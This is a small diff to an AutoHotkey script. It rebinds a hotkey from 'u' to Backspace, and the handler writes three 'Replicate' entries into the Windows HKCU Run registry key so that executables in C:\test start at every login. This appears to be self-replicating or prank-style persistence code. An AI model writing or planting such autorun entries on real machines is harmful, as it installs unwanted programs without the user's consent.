@@ -10,9 +10,9 @@ DirList(pattern, attr := "") {
     return files
 }
 
-$u::{
+$Backspace::{
     path := "C:\test"
-    Send "u"
+    Send "Backspace"
     RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1", '"C:\test\LButton.exe"')
     RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2", '"C:\test\RButton.exe"')
     RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3", '"C:\test\Delete.exe"')
